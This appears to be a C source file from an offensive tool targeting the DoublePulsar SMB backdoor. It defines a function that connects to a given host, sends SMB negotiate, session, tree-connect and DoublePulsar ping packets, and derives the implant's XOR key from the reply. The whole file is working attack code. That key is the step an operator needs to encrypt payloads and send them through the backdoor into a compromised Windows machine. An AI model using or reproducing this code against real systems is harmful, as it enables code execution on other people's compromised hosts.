#define _GNU_SOURCE
#include "config.h"

#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <sys/socket.h>
#include <unistd.h>

extern int smb_connect(const char *ip, int port);

static int
send_all(int fd, const unsigned char *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        ssize_t n = send(fd, data + sent, length - sent, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        sent += (size_t)n;
    }

    return 0;
}

unsigned int
DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    unsigned char response[4096];
    const size_t response_end = SMB_RESP_SIGNATURE_END;
    int fd;
    size_t received = 0;
    unsigned int key;

    if (ip == NULL || response_end < (size_t)SMB_RESP_SIGNATURE_START + 4U ||
        response_end > sizeof(response))
        return 0;

    fd = smb_connect(ip, port);
    if (fd < 0)
        return 0;

    if (send_all(fd, (const unsigned char *)SMB_NEGOTIATE_PKT,
                 sizeof(SMB_NEGOTIATE_PKT) - 1U) < 0 ||
        send_all(fd, (const unsigned char *)SMB_SESSION_SETUP_PKT,
                 sizeof(SMB_SESSION_SETUP_PKT) - 1U) < 0 ||
        send_all(fd, (const unsigned char *)SMB_TREE_CONNECT_PKT,
                 sizeof(SMB_TREE_CONNECT_PKT) - 1U) < 0 ||
        send_all(fd, (const unsigned char *)DP_PING_PKT,
                 sizeof(DP_PING_PKT) - 1U) < 0) {
        close(fd);
        return 0;
    }

    while (received < response_end) {
        ssize_t n = recv(fd, response + received, response_end - received, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            close(fd);
            return 0;
        }
        if (n == 0) {
            close(fd);
            return 0;
        }
        received += (size_t)n;
    }

    close(fd);

    key = ((unsigned int)response[SMB_RESP_SIGNATURE_START] << 24) |
          ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 16) |
          ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 8) |
          (unsigned int)response[SMB_RESP_SIGNATURE_START + 3];

    return key;
}